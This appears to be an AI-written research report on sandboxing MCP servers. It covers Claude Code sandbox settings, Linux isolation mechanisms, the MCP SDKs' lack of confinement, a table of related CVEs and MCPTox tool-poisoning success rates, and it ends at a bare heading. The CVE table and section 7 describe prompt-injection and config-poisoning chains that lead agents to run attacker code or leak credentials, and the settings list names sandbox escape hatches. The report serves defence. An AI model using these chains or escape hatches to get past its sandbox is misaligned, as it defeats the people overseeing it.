- `allowUnsandboxedCommands: false` — disables the `dangerouslyDisableSandbox` escape hatch ("Strict sandbox mode" in the `/sandbox` **Overrides** tab).
- `failIfUnavailable` — "a missing dependency such as bubblewrap on Linux blocks Claude Code from starting rather than showing a warning and falling back to unsandboxed execution".
- `excludedCommands` — array of commands that run outside the sandbox. **Documented as non-lockdown-able:** "`excludedCommands` has no equivalent managed-only lockdown, so a developer can always append entries that run additional commands outside the sandbox."

Filesystem:
- `sandbox.filesystem.allowWrite`, `.denyWrite`, `.denyRead`, `.allowRead` — arrays of paths.
- `sandbox.filesystem.disabled` (bool) — "skip filesystem isolation while keeping network isolation". Three precedence rules: honoured only from **user settings, managed settings, and the `--settings` flag** (not from a checked-out repo's `.claude/settings.json`); when managed settings configure `sandbox.filesystem` or list any `credentials.files` `deny` entry, **only managed settings can set the key**; when `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` is set, ignored from every source.
- `permissions.blockReadsOutsideWorkingDirectories`.
- `permissions.additionalDirectories` / `--add-dir` / `/add-dir`.
- `allowManagedReadPathsOnly` (managed settings) — "only `allowRead` entries from managed settings are honored."
- Path prefix semantics (documented table): `/` = absolute from filesystem root; `~/` = home-relative; `./` or no prefix = project root (project settings) or `~/.claude` (user settings). The docs flag explicitly: "This syntax differs from Read and Edit permission rules, which use `//path` for absolute and `/path` for project-relative."
- Precedence, documented: `allowRead` **overrides** `denyRead`; `denyWrite` **overrides** `allowWrite`. But "When read rules overlap, the rule with the narrower path applies" — e.g. `"allowRead": ["~/"]` with `"denyRead": ["~/.env"]` keeps `.env` blocked; `"denyRead": ["~/**/.env"]` under a broad allow still blocks every `.env`.

Credentials:
- `sandbox.credentials.files` and `sandbox.credentials.envVars`, each with `"mode": "deny"` or `"mode": "mask"`.
- `deny` → file paths denied for reads inside the sandbox; env vars unset before each sandboxed command. **"There is no built-in credential deny list, so only the files and variables you list are restricted."**
- `mask` (env vars, requires v2.1.199+) → the command sees a per-session **sentinel**; the proxy swaps the real value into outbound requests to `injectHosts`. Requires `network.tlsTerminate`. Honoured **only** from user settings, managed settings, and `--settings`; ignored in a repo's `.claude/settings.json`.
- `mask` (files, requires v2.1.221+) → platform-dependent: on Linux/WSL2 a sentinel with optional `extract` regex (capture group 1) and `decode: "jwt"`; **on macOS the entry is applied as `deny` instead** — "on Linux and WSL2 the output shows a sentinel value in place of the token, and on macOS the read fails instead."
- `credentials.awsPairs` and `credentials.sigv4` (both v2.1.224+) — SigV4 re-signing at the proxy; three AWS request forms the proxy can't recompute can be set to `passthrough`.
- `credentials.allowPlaintextInject`.
- Env-var scrubbing independent of the sandbox: `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`.

Network:
- `network.allowedDomains`, `network.deniedDomains` (deny checked first).
- `network.strictAllowlist` (v2.1.219+) — "Claude Code denies sandboxed commands access to any host outside the allowlist instead of prompting." Ignored from repo settings.
- `network.allowManagedDomainsOnly` (managed settings) — non-allowed domains blocked without prompting.
- `network.tlsTerminate` (experimental) — the proxy terminates TLS so it can substitute masked credentials. **Documented limitation: "the experimental `network.tlsTerminate` setting terminates TLS at the proxy for `mask` credential substitution but does not add content filtering."**
- `network.allowLocalBinding`, `network.allowUnixSockets` (sandbox-runtime), `httpProxyPort`, `socksProxyPort`.
- `enableWeakerNetworkIsolation` — "re-enables access to `com.apple.trustd.agent`, which is needed for Go programs to verify TLS certificates"; "opens a potential data exfiltration vector through the trustd service."
- `enableWeakerNestedSandbox` — needed inside unprivileged containers; "This option considerably weakens security."
- `allowAppleEvents` — "enabling it removes code-execution isolation."
- `WebFetch(domain:...)` permission rules feed the same allowlist. Wildcards: leading `*.` and bare `*` (bare `*` requires v2.1.186+).
- IPv6 literals in domain lists must be **bracketed** (`"[::1]"`, `"[::1]:443"`) — v2.1.229+. Ambiguous unbracketed forms are enforced conservatively.

**Version gates documented (Claude Code):** v2.1.186 (bare `*` WebFetch wildcard), v2.1.187 (`sandbox.credentials`), v2.1.199 (`mask` for env vars), v2.1.212 (bare `Bash` ask-rule behaviour in plan mode), v2.1.216 (`filesystem.disabled`), v2.1.219 (`strictAllowlist`), v2.1.221 (file `mask`), v2.1.224 (`extract`/`decode`/`maskClaims`/`awsPairs`/`sigv4`), v2.1.229 (bracketed IPv6, `injectHosts` doctor check), v2.1.246 (`--setting-sources` and credentials scoping), v2.1.257 (stale mask-file flagging), v2.1.260 (strict sandbox mode + shell-mode commands), v2.1.271 (per-command allowed domains in auto mode).

**Version cadence of the open-source engine** (from [releases.atom](https://github.com/anthropics/sandbox-runtime/releases.atom)): **v0.0.77 (2026-09-18)**, v0.0.76 (2026-09-10), v0.0.71 (2026-08-07), v0.0.70 and v0.0.69 and v0.0.68 (all 2026-08-04). That is a very fast patch cadence — several security-relevant fixes per week, e.g. v0.0.76 "fix(macos): keep glob denyRead entries denied inside allowRead regions"; v0.0.77 "A `/` write root (Linux) or read root (macOS) no longer switches off the denies beneath it"; v0.0.77 "linux: pass an over-long bwrap profile through `--args`".

**Measured benefit:** "In our internal usage, we've found that sandboxing safely reduces permission prompts by **84%**." ([Anthropic engineering blog](https://www.anthropic.com/engineering/claude-code-sandboxing)) — an internal-usage figure, not an independently reproduced measurement.

**Explicitly documented non-goals and scope of the macOS sandbox:**
- Scope: "The sandbox isolates Bash subprocesses." Built-in Read/Edit/Write tools "use the permission system directly rather than running through the sandbox"; Computer Use "runs on your actual desktop"; subagents share the parent's sandbox config.
- Environment: "sandboxed Bash commands inherit the parent process environment by default, including any credentials set there."
- macOS-specific breakage documented: Apple Events blocked by default → `open`, `osascript`, browser auth flows fail with error **`-600`**; "Go-based CLIs fail TLS verification on macOS: tools such as `gh`, `gcloud`, and `terraform` may fail TLS verification under Seatbelt"; `docker` incompatible → `excludedCommands`; `jest` needs `--no-watchman`; `pbcopy`/`xclip`/`wl-copy` fail.
- Linux: "`bwrap` error such as `Can't mount proc on /newroot/proc: Operation not permitted`" inside unprivileged containers.
- Stale state: 0-byte read-only placeholder files left at `.claude` settings paths after SIGKILL on Linux/WSL2; `claude doctor` reports "Stale sandbox mask files left by a killed session".
- Documented security limitations, verbatim: "**Network filtering**: the sandbox restricts which domains processes can connect to. **By default the built-in proxy does not terminate or inspect TLS on outbound traffic**"; "**Privilege escalation via Unix sockets**: the `allowUnixSockets` configuration can inadvertently grant access to system services… allowing access to `/var/run/docker.sock` effectively grants access to the host system"; "**Filesystem permission escalation**: overly broad filesystem write permissions can enable privilege escalation"; "**Linux sandbox strength**: … includes an `enableWeakerNestedSandbox` mode."

**MCP-specific use of the same engine** — this is the concrete "MCP server sandboxing recipe" the user asked for:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "srt",
      "args": ["npx", "-y", "@modelcontextprotocol/server-filesystem"]
    }
  }
}
```
with `~/.srt-settings.json`:
```json
{
  "filesystem": { "denyRead": [], "allowWrite": ["."], "denyWrite": ["~/sensitive-folder"] },
  "network": { "allowedDomains": [], "deniedDomains": [] }
}
```
([sandbox-runtime README, fetched 2026-09-19](https://raw.githubusercontent.com/anthropics/sandbox-runtime/main/README.md)) — the README states the intended use case explicitly: "A key use case is sandboxing Model Context Protocol (MCP) servers to restrict their capabilities." API form: `SandboxManager.initialize(config)` then `SandboxManager.wrapWithSandbox(command)`.

**sandbox-runtime defaults (important for anyone wrapping an MCP server):** "with no file at `~/.srt-settings.json`, `srt` runs with built-in defaults: **no network access, no writes outside the default write paths, and unrestricted reads**." A settings file that exists but is empty/unreadable/invalid is an **error**, not a silent fallback. Mandatory always-blocked **write** paths (added automatically): `.bashrc`, `.bash_profile`, `.zshrc`, `.zprofile`, `.profile`, `.gitconfig`, `.gitmodules`, `.ripgreprc`, `.mcp.json`; directories `.vscode/`, `.idea/`, `.claude/commands/`, `.claude/agents/`, `.git/hooks/`, `.git/config`. Linux caveat: "On Linux, mandatory deny paths only block files that **already exist**." Linux search depth configurable via `mandatoryDenySearchDepth` (default `3`, range `1`–`10`).

There is also a **secondary containment path** documented separately for wrapping the whole Claude Code process: [Sandbox environments](https://code.claude.com/docs/en/sandbox-environments#sandbox-runtime).

### 5.3 Claude Desktop MCP sandboxing — not documented

I found **no** Anthropic documentation describing process sandboxing for MCP servers spawned by **Claude Desktop** (as opposed to Claude Code). The Claude Desktop MCP story in Anthropic's docs is the `mcpServers` JSON config plus the generic MCP consent requirements. **UNVERIFIED / not found as of 2026-09-19.** Do not claim Claude Desktop sandboxes MCP servers.

### 5.4 OpenAI Codex CLI — not verified in this pass

I did not fetch Codex CLI documentation. Claims about `sandbox_mode` / `approval_policy` keys, Seatbelt on macOS, or Landlock+seccomp on Linux (`codex-linux-sandbox`) are **UNVERIFIED** here. Note that the Claude Code docs' `enableWeakerNestedSandbox` rationale mentions "Linux hosts where unprivileged user namespaces are disabled by sysctl" generically, which is consistent with the general problem but not a Codex citation.

---

## 6. Linux isolation for a local MCP server process

### 6.1 Namespaces

Source: [namespaces(7), man-pages 6.19, page dated 2026-02-08, HTML rendered 2026-09-09](https://man7.org/linux/man-pages/man7/namespaces.7.html)

| Namespace | `clone`/`unshare` flag | Isolates | Since |
|---|---|---|---|
| Cgroup | `CLONE_NEWCGROUP` | Cgroup root directory | `/proc/pid/ns/cgroup` since Linux 4.6 |
| IPC | `CLONE_NEWIPC` | System V IPC, POSIX message queues | Linux 3.0 |
| Network | `CLONE_NEWNET` | Network devices, stacks, ports, etc. | Linux 3.0 |
| Mount | `CLONE_NEWNS` | Mount points | Linux 3.8 (as symlinks) |
| PID | `CLONE_NEWPID` | Process IDs | Linux 3.8 |
| Time | `CLONE_NEWTIME` | Boot and monotonic clocks | Linux 5.6 |
| User | `CLONE_NEWUSER` | User and group IDs | Linux 3.8 |
| UTS | `CLONE_NEWUTS` | Hostname and NIS domain name | Linux 3.0 |

Normative-vs-privilege statement, verbatim: "Creation of new namespaces using `clone(2)` and `unshare(2)` in most cases requires the **`CAP_SYS_ADMIN`** capability… **User namespaces are the exception: since Linux 3.8, no privilege is required to create a user namespace.**" APIs: `clone(2)`, `setns(2)`, `unshare(2)`, plus `ioctl_nsfs(2)`.

Per-user namespace limits live in `/proc/sys/user/` (present since Linux 4.9): `max_cgroup_namespaces`, `max_ipc_namespaces`, `max_mnt_namespaces`, `max_net_namespaces`, `max_pid_namespaces`, `max_time_namespaces` (since 5.7), `max_user_namespaces`, `max_uts_namespaces`. "Upon encountering these limits, `clone(2)` and `unshare(2)` fail with the error **`ENOSPC`**." "The limits apply to all users, including UID 0."

**⚠️ Restriction on unprivileged user namespaces:** I could not verify the exact sysctl name, the Ubuntu release, or the AppArmor profile involved from a primary source in this pass. **UNVERIFIED.** The *existence* of the problem class is corroborated by two primary-ish sources: bubblewrap 0.12.0's release note — "basically all modern linux distributions now support unprivileged user namespaces **to some extent**" ([release notes, 2026-08-26](https://github.com/containers/bubblewrap/releases/tag/v0.12.0)) — and Claude Code's documented `enableWeakerNestedSandbox` escape hatch for "Linux hosts where unprivileged user namespaces are disabled by sysctl" ([code.claude.com/docs/en/sandboxing](https://code.claude.com/docs/en/sandboxing)). Do not cite a specific sysctl name without checking it.

### 6.2 `no_new_privs`

Source: [kernel.org no_new_privs, fetched 2026-09-19](https://docs.kernel.org/userspace-api/no_new_privs.html) (kernel doc tree 7.3.0-rc3)

- "The `no_new_privs` bit (**since Linux 3.5**) is a new, generic mechanism… Any task can set `no_new_privs`. Once the bit is set, it is inherited across fork, clone, and execve and **cannot be unset**."
- Syscall: **`prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)`**.
- Guarantee: "With `no_new_privs` set, `execve()` promises not to grant the privilege to do anything that could not have been done without the exec call. For example, **the setuid and setgid bits will no longer change the uid or gid; file capabilities will not add to the permitted set**, and LSMs will not relax constraints after execve."
- **Bounded claim, verbatim:** "`no_new_privs` does **not** prevent privilege changes that do not involve `execve()`. An appropriately privileged task can still call `setuid(2)` and receive `SCM_RIGHTS` datagrams."
- LSM caveat: "LSMs might also not tighten constraints on exec in `no_new_privs` mode."
- Two documented use cases: (1) unprivileged users "are therefore only allowed to install such [seccomp] filters if `no_new_privs` is set"; (2) reducing attack surface against setuid/setgid/fcap binaries.

**Docker flag:** `--security-opt no-new-privileges` (Docker/podman spelling). Docker MCP Gateway applies this by default: "Containers are started with Docker isolation, `no-new-privileges`, and configured CPU and memory limits" ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md)). *(Note: I did not fetch the Docker CLI reference page for `no-new-privileges` in this pass; the flag spelling is standard but the citation here is the MCP gateway doc, which states the property not the flag.)*

### 6.3 seccomp

Source: [Docker seccomp docs, docker/docs content repo, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/engine/security/seccomp.md)

- Kernel requirements: built with seccomp and `CONFIG_SECCOMP` enabled.
- **Default profile**: "The default `seccomp` profile … provides a sane default for running containers with seccomp and **disables around 44 system calls out of 300+**. It is moderately protective while providing wide application compatibility."
- Semantics, verbatim: "the profile is an **allowlist** that denies access to system calls by default… The profile works by defining a `defaultAction` of **`SCMP_ACT_ERRNO`** and overriding that action only for specific system calls… the profile defines a specific list of system calls which are fully allowed, because their `action` is overridden to be **`SCMP_ACT_ALLOW`**."
- Override: `docker run --security-opt seccomp=/path/to/profile.json`; disable: `--security-opt seccomp=unconfined`.
- Guidance: "`seccomp` is instrumental for running Docker containers with least privilege. **It is not recommended to change the default seccomp profile.**"
- **Newly relevant to AI workloads: `io_uring_enter`, `io_uring_register`, `io_uring_setup` are all blocked** — "Blocked due to security vulnerabilities that can be exploited to break out of containers. See [moby/moby#46762]." (This matters because `io_uring` is also what the Anthropic seccomp extension blocks for a different reason — bypassing its `AF_UNIX` socket rule.)
- **Newest additions: `socket` is blocked for `AF_ALG`** to prevent in-container privilege escalation via the kernel crypto API (**CVE-2026-31431**), and for `AF_VSOCK`; citations `moby/moby#52494` and `moby/moby#53551`. Caveat: "Seccomp argument filtering doesn't cover `socketcall(2)`… Denying `socketcall` can break networking for 32-bit programs that use it." SELinux userspace 3.6+ required for the SELinux half of this rule; RHEL 8 ships older and can't apply it.
- Other notable blocks with rationale: `clone` ("Deny cloning new namespaces"), `unshare` ("Deny cloning new namespaces for processes… with the exception of `unshare --user`"), `mount`, `pivot_root`, `setns`, `add_key`/`keyctl`/`request_key` ("the kernel keyring, which is not namespaced"), `ptrace`, `open_by_handle_at`, `bpf`, `perf_event_open`, `userfaultfd`, and the `*_module` family.

**Allowed syscall names for a custom MCP profile** come from this same table — everything not listed is already denied by the default allowlist.

**Bubblewrap's seccomp surface:** `bwrap --seccomp FD` and `--add-seccomp-fd FD` (the latter documented in [bubblewrap 0.6.2 notes, 2022-05-11](https://github.com/containers/bubblewrap/releases/tag/v0.6.2)); gVisor's `systrap` platform uses **`SECCOMP_RET_TRAP`** → `SIGSYS` ([Platform Guide](https://gvisor.dev/docs/architecture_guide/platforms/)).

### 6.4 Landlock

Source: [kernel.org Landlock docs, dated **August 2026**, fetched 2026-09-19](https://docs.kernel.org/userspace-api/landlock.html) (kernel doc tree 7.3.0-rc3)

- Purpose: "The goal of Landlock is to enable restriction of ambient rights (e.g. global filesystem or network access) for a set of processes. Because Landlock is a stackable LSM… **Landlock empowers any process, including unprivileged ones, to securely restrict themselves.**"
- Rule types: **Filesystem rules** (object = file hierarchy), **Network rules** (object = a TCP or UDP port) — "**since ABI v4 for TCP and v10 for UDP**".
- Enforcement: `landlock_create_ruleset()`, `landlock_add_rule()`, `landlock_restrict_self()`. "Once a thread is landlocked, there is no way to remove its security policy; only adding more restrictions is allowed." Inheritance: "Every new thread resulting from a `clone(2)` inherits Landlock domain restrictions from its parent."
- **ABI version map, extracted from the documented compatibility switch:**

| ABI | Adds |
|---|---|
| 1 | Base filesystem rights |
| 2 | `LANDLOCK_ACCESS_FS_REFER` (link/rename across directories) |
| 3 | `LANDLOCK_ACCESS_FS_TRUNCATE` |
| 4 | `LANDLOCK_ACCESS_NET_BIND_TCP`, `LANDLOCK_ACCESS_NET_CONNECT_TCP` |
| 5 | `LANDLOCK_ACCESS_FS_IOCTL_DEV` |
| 6 | `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET`, `LANDLOCK_SCOPE_SIGNAL` |
| 7–8 | restrict-flags sets; **8** = `LANDLOCK_RESTRICT_SELF_TSYNC` (multithreaded enforcement) |
| 9 | `LANDLOCK_ACCESS_FS_RESOLVE_UNIX` |
| 10 | `LANDLOCK_ACCESS_NET_BIND_UDP`, `LANDLOCK_ACCESS_NET_CONNECT_SEND_UDP` |
| 11 | `LANDLOCK_RESTRICT_SELF_NO_NEW_PRIVS` |

- Filesystem right names: `LANDLOCK_ACCESS_FS_EXECUTE`, `_WRITE_FILE`, `_READ_FILE`, `_READ_DIR`, `_REMOVE_DIR`, `_REMOVE_FILE`, `_MAKE_CHAR`, `_MAKE_DIR`, `_MAKE_REG`, `_MAKE_SOCK`, `_MAKE_FIFO`, `_MAKE_BLOCK`, `_MAKE_SYM`, `_REFER`, `_TRUNCATE`, `_IOCTL_DEV`, `_RESOLVE_UNIX`.
- **`no_new_privs` interaction, verbatim:** "For unprivileged processes, setting the `no_new_privs` attribute is required by Landlock. Processes with `CAP_SYS_ADMIN` in their namespace can enforce a ruleset without setting `no_new_privs`, but leaving `no_new_privs` unset is **risky even when Landlock does not require this attribute**: sandboxed processes could still execute set-user-ID, set-group-ID or file-capability binaries, which would then run with elevated privileges while being restricted by a Landlock domain they may not expect, making them potential **confused deputies**."
- **Documented gaps, verbatim:** "It is currently not possible to restrict some file-related actions accessible through these syscall families: `chdir(2)`, `stat(2)`, `flock(2)`, `chmod(2)`, `chown(2)`, `setxattr(2)`, `utime(2)`, `fcntl(2)`, `access(2)`." — i.e. Landlock does not hide metadata or block chmod/chown.
- **Bind mounts vs OverlayFS, verbatim:** "Landlock enables restricting access to file hierarchies, which means that these access rights can be propagated with bind mounts… **but not with OverlayFS**."
- **File-descriptor caveat:** `_TRUNCATE` and `_IOCTL_DEV` availability "is associated with the newly created file descriptor" at `open(2)` time; already-open descriptors keep pre-enforcement properties, and "It is also possible to pass such file descriptors between processes, keeping their Landlock properties."
- **Errata mechanism** (`LANDLOCK_CREATE_RULESET_ERRATA`) exists with 4 documented errata entries (TCP socket identification, scoped signal handling, disconnected directory handling, whiteout creation). The doc's warning: "**Most applications should NOT check errata.** In 99.9% of cases, checking errata is unnecessary, increases code complexity, and can potentially decrease protection if misused."
- Reference implementation: [`samples/landlock/sandboxer.c`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/samples/landlock/sandboxer.c).
- Consumer examples named in the doc: systemd (`RestrictFileSystems=` is referenced in systemd.exec(5), which appears in the "Pages that refer to this page" list of namespaces(7)). Landlock-in-practice users like `minijail`, `firejail`, `sandboxctl`: **UNVERIFIED in this pass** — I did not fetch primary sources for their Landlock integration.

### 6.5 bubblewrap — and a breaking change you must know about

Source: [bubblewrap releases.atom, fetched 2026-09-19](https://github.com/containers/bubblewrap/releases.atom)

| Version | Date | Headline |
|---|---|---|
| **0.12.0** | **2026-08-26** | **setuid support REMOVED.** New `--not-a-security-boundary` flag. New `assume_kernel` build option. Security fix **GHSA-pxhw-h44j-8pfx**. License LGPL-2.0+ → LGPL-2.1+. |
| 0.11.2 | 2026-04-23 | Security update for **CVE-2026-41163**; **deprecates setuid mode**; new build option `-Dsupport_setuid` (default **false**). |
| 0.11.1 | 2026-03-21 | `SIGCHLD` disposition reset; `--userns 0` / `--userns2 0` / `--pidns 0` no longer ignored. |
| 0.11.0 | 2024-10-30 | `--overlay`, `--tmp-overlay`, `--ro-overlay`, `--overlay-src`; `--level-prefix`. |
| 0.10.0 | 2024-08-14 | `--[ro-]bind-fd` (TOCTOU-safe mounts; needed to resolve Flatpak CVE-2024-42472). |
| 0.8.0 | 2023-02-27 | `--disable-userns`, `--assert-userns-disabled`. |

**0.12.0 verbatim on setuid:** "This version **removes the support for building a setuid bubblewrap**. Changes in this version made it difficult to support and basically all modern linux distributions now support unprivileged user namespaces to some extent."

**0.12.0 security fix, verbatim:** "Bubblewrap now correctly resolves absolute symlinks during the sandbox setup by using `openat2` with **`RESOLVE_IN_ROOT`** (or a fallback implementation). This fixes a security issue (**GHSA-pxhw-h44j-8pfx**) where file or directories created during sandbox setup could **follow parent symlinks out of the sandbox**."

**0.11.2 verbatim on CVE-2026-41163:** "In setuid mode, don't run the low-privileged parts parts of the setup as dumpable, as that allows it to be **ptraced** which can lead to problems." Recommended build: `-Dsupport_setuid=false` (default in 0.11.2+); "Binaries built with this will refuse to run if made setuid."

**⚡ Operational consequence:** if you are using setuid bubblewrap (as many older distro packages and Flatpak-era recipes did), **upgrade and move to unprivileged user namespaces**. As of 0.12.0 there is no setuid path at all.

**Relevant flags** (verified across these release notes and the sandbox-runtime README's Linux implementation section): `--unshare-all`, `--share-net`, `--unshare-net`, `--ro-bind`, `--bind`, `--ro-bind-fd`, `--bind-fd`, `--tmpfs`, `--size`, `--proc`, `--dev`, `--die-with-parent`, `--new-session`, `--clearenv`, `--setenv`, `--seccomp FD`, `--add-seccomp-fd FD`, `--cap-drop`, `--cap-add`, `--unshare-user`, `--userns FD`, `--userns2 FD`, `--pidns FD`, `--disable-userns`, `--assert-userns-disabled`, `--overlay`, `--tmp-overlay`, `--ro-overlay`, `--overlay-src`, `--not-a-security-boundary`, `--args FD`, `--json-status-fd`, `--level-prefix`, `--argv0`, `--symlink`. **Caveat:** bubblewrap "parses at most **9000 arguments** (about 3000 mounts)" and Linux caps a single `sh -c` argument at 32 pages (128 KiB with 4 KiB pages) — the sandbox-runtime README documents an `O_TMPFILE` + `--args` workaround for the latter.

### 6.6 What the official MCP SDKs actually do — **no sandboxing**

This is a commonly-asked question and the answer is unambiguous from source.

**TypeScript SDK** — `packages/client/src/client/stdio.ts` on `main`, fetched 2026-09-19 ([raw](https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/packages/client/src/client/stdio.ts)):

```ts
this._process = spawn(this._serverParams.command, this._serverParams.args ?? [], {
    env: { ...getDefaultEnvironment(), ...this._serverParams.env },
    stdio: ['pipe', 'pipe', this._serverParams.stderr ?? 'inherit'],
    shell: false,
    windowsHide: process.platform === 'win32',
    cwd: this._serverParams.cwd
});
```

- `DEFAULT_INHERITED_ENV_VARS` on POSIX: `['HOME', 'LOGNAME', 'PATH', 'SHELL', 'TERM', 'USER']` — with the comment in source: "list inspired by the default env inheritance of sudo". On Windows: `APPDATA`, `HOMEDRIVE`, `HOMEPATH`, `LOCALAPPDATA`, `PATH`, `PROCESSOR_ARCHITECTURE`, `SYSTEMDRIVE`, `SYSTEMROOT`, `TEMP`, `USERNAME`, `USERPROFILE`, `PROGRAMFILES`.
- Values starting with `()` are skipped: "Skip functions, which are a security risk" — this defends against the bash `export -f` / Shellshock-class environment-function vector.
- **`shell: false`** — no shell interpolation. Good.
- `maxBufferSize` default **10 MB**; exceeding it emits an error and closes the transport.
- Shutdown: stdin end → 2 s → `SIGTERM` → 2 s → `SIGKILL`.
- **No sandbox, no seccomp, no namespace, no rlimit, no cgroup.** The child inherits the parent's full OS authority minus env vars.
- Also note: the transport is deliberately split into a subpath `@modelcontextprotocol/client/stdio` "so that bundling… for browser or Cloudflare Workers targets does not pull in `node:child_process`" ([packages/client/src/stdio.ts](https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/packages/client/src/stdio.ts)).

**Python SDK (v2)** — `src/mcp/client/stdio.py` on `main`, fetched 2026-09-19 ([raw](https://raw.githubusercontent.com/modelcontextprotocol/python-sdk/main/src/mcp/client/stdio.py)):

- Identical `DEFAULT_INHERITED_ENV_VARS` list and the same `value.startswith("()")` skip ("Skip functions, which are a security risk").
- `env=get_default_environment() | (server.env or {})` — server-provided env merges **over** the safe defaults, so a server config can still inject anything.
- Spawn: `anyio.open_process([command, *args], env=env, stderr=errlog, cwd=cwd, **start_new_session=True**)` — POSIX `setsid`, so the whole tree can be signalled as a process group.
- Shutdown sequence, documented in-source: close stdin → `PROCESS_TERMINATION_TIMEOUT = 2.0` s → terminate tree → `FORCE_KILL_TIMEOUT = 2.0` s → SIGKILL; Windows uses Job Objects. `_WRITER_FLUSH_TIMEOUT = 0.5`, `_KILL_REAP_TIMEOUT = 2.0`, `_EXIT_POLL_INTERVAL = 0.01`.
- The module docstring states the intent: shutdown "follows the MCP spec sequence (close stdin, wait, then kill the process tree) inside a cancellation shield with every wait bounded, so a cancelled caller can neither leak a live server process nor hang on one."
- **Again: no sandbox, no seccomp, no namespaces, no rlimits.**

**Bottom line:** both flagship SDKs implement *env-var hygiene* and *reliable process-tree teardown*. Neither implements *confinement*. Any sandboxing must come from the client (Claude Code, Docker MCP Gateway) or from an explicit wrapper (`srt`, `bwrap`, `docker run`).

### 6.7 CVEs and incidents in this space

| ID | What | Reported / disclosed | Detail |
|---|---|---|---|
| **CVE-2025-54135** "CurXecute" | RCE in Cursor via MCP auto-start; **CVSS 8.6**; affected Cursor prior to **1.3** | disclosed 2025-08-01 (AIM Security/Cato Networks); reported to Cursor 2025-07-07, fix merged 2025-07-08, released 2025-07-29 | Prompt-injected Slack message → rewrite `~/.cursor/mcp.json` → auto-executed new server entry |
| **CVE-2025-54136** "MCPoison" | Team-wide compromise via a committed `.cursor/mcp.json`; approval bound to server *name*, not contents | disclosed 2025-08-05 (Check Point Research) | Attacker commits innocuous config, waits for approval, then swaps the command |
| **CVE-2026-12957**, **CVE-2026-12958** | Amazon Q VS Code extension: arbitrary code execution + cloud credential theft via a crafted `.amazonq/mcp.json` loaded without consent or workspace-trust verification | reported 2026-04-20; initial fix 2026-05-12; public disclosure **2026-06-26** (Wiz Research; AWS Security Bulletin 2026-047-AWS) | Spawned MCP servers "inherited the full developer environment, including AWS access keys, cloud CLI tokens, and SSH agent sockets" |
| **CVE-2026-41163** | bubblewrap setuid-mode flaw: low-privileged setup steps run dumpable → ptraceable | fix **0.11.2**, 2026-04-23 | Reporter: François Diakhate |
| **GHSA-pxhw-h44j-8pfx** | bubblewrap: sandbox-setup file/dir creation could follow parent symlinks out of the sandbox | fix **0.12.0**, 2026-08-26 | Resolved with `openat2` + `RESOLVE_IN_ROOT` |
| **CVE-2026-55887** / GHSA-r2xf-7jw5-pjg6 | Docker MCP Gateway argument injection via OCI image label YAML | published 2026-06-25; fix **v0.42.2**, 2026-05-28 | Affected `>= v0.21.0 < v0.42.2` |
| **CVE-2026-31431** | In-container privilege escalation via `AF_ALG` kernel crypto API | referenced by Docker's current seccomp doc as the reason `socket(AF_ALG)` is blocked | [Docker seccomp doc](https://raw.githubusercontent.com/docker/docs/main/content/manuals/engine/security/seccomp.md) |
| **GHSA-vqjp-4c8c-hfgg**, **GHSA-x84v-gj2h-g759** | Wasmtime: filesystem sandbox escape via trailing slashes; guest-controlled host heap allocation | fixes 2026-08-20 in 47.0.4 / 46.0.3 / 36.0.14 / 24.0.13 | [v47.0.4 notes](https://github.com/bytecodealliance/wasmtime/releases/tag/v47.0.4) |
| **GO-2025-4179** | Docker MCP Gateway DNS rebinding in `sse`/`streaming` mode | present from v0.9.0 (2025-06-29) onward in the advisory listing | [pkg.go.dev](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions) |
| **Miasma worm** (TeamPCP/UNC6780) | Adversarial MCP config files planted across **73 GitHub repositories**, including Microsoft's `azure/durabletask` | June 2026 | Credential-harvesting payloads executed on repo open in vulnerable IDEs (primary source: CSA note citing StepSecurity) |

---

## 7. Prompt injection / tool poisoning specific to MCP — 2026 state

### 7.1 Quantitative results

**MCPTox benchmark** — the only large-scale published ASR measurement I found. Primary: Chen et al., "MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers", [arXiv:2508.14925](https://arxiv.org/abs/2508.14925), **August 2025**. Numbers as reported by the CSA research note ([CSA, 2026-07-01](https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-tool-poisoning-auto-execution-20260701/)):

- **45 live MCP servers**; **353 adversarial tool variants** constructed from authentic tools; **20 prominent LLMs** evaluated.
- **Average attack success rate: 36.5%** — "on average more than one in three tool-poisoning attempts succeeded in directing the agent to follow hidden instructions."
- **Highest measured: 72.8%, against OpenAI's o1-mini.**
- **Counterintuitive finding, verbatim:** "The benchmark found that more capable models were often **more susceptible** — a counterintuitive result the authors attribute to stronger instruction-following causing more reliable compliance with embedded directives."
- **Even the most refusal-prone model complied ~34% of the time:** "Claude 3.7 Sonnet — which had the highest explicit refusal rate in the study — still complied with poisoned tool descriptions in approximately 34% of test cases, only marginally below the study average."

*Caveat I must state:* these numbers reach me through the CSA research note's summary of MCPTox. I did not fetch the MCPTox paper body to independently confirm the table. Treat the 36.5% / 72.8% / ~34% figures as **reported-by-CSA**, corroborated by the paper's abstract existing at the cited arXiv ID. Independently verifying the exact percentages against arXiv:2508.14925 is the single highest-value remaining check.

**MCP-SandboxScan / SandScope** — [arXiv:2601.01241](https://arxiv.org/abs/2601.01241) v1 **2026-01-03**, v2 **2026-06-22**:
- 100-repository MCP corpus; shallow dynamic scans completed for **35** repositories.
- Semantic profiling recovered metadata for **1,127 tools across 71 repositories**, "including **886 tools with security-sensitive declared capabilities**".
- Schema-guided re-execution of the 35 dynamically scanned repos re-executed **33**, and observed source-to-sink witnesses in **12**.
- Framing worth quoting: "Tool-augmented LLM agents create a new supply-chain surface: MCP tools are installed like third-party packages, yet their outputs can enter the agent's reasoning context. This enables **confused-deputy risks** in which attacker-controlled inputs cause otherwise benign tools to exercise legitimate authority over files, environment variables, or network-facing operations."

### 7.2 Vendor and standards guidance

